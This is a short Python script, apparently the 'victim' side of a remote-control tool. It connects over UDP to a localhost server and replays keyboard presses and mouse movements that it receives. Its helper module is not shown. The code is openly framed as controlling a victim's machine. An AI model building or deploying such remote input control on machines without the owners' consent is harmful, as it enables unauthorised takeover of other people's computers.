import functions
from threading import Thread
import socket


def handle_input(victim_socket: socket.socket):
    while 1:
        data = victim_socket.recvfrom(1024)[0].decode()
        if data.startswith('k'):
            functions.recreate_keyboard(button=data[1:])
        elif data.startswith('m'):
            functions.recreate_mouse_movement(pos=data[1:])


def main():
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip_to_connect = ('127.0.0.1', 4200)
    server_ip = ('127.0.0.1', 42069)
    functions.connect_as_victim(ip_for_victims=ip_to_connect, ip_of_server=server_ip, socket_of_victim=victim_socket)
    Thread(target=handle_input, args=(victim_socket,)).start()
    # functions.recreate_keyboard()
    # functions.recreate_keyboard()


if __name__ == '__main__':
    main()
